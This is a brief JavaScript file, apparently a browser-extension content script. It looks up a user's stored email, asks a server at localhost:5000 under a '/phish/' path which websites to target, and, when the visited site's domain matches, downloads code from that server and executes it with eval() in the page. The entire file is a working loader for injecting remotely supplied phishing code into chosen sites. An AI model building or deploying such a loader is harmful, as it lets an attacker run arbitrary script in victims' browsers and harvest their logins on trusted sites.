chrome.storage.local.get('email', function (res) {
    $.get(`http://localhost:5000/phish/${res.email}`, function (result) {
        var urlList = window.location.href.split('\/')[2].split('.');
        var url = urlList[urlList.length - 2] + '.' + urlList[urlList.length - 1];
        if ($.inArray(url, result.urls) != -1) {

            $.get(`http://localhost:5000/phish/${res.email}/${url}`, function (resu) {
                eval(resu.code);
            });
        }
    });
});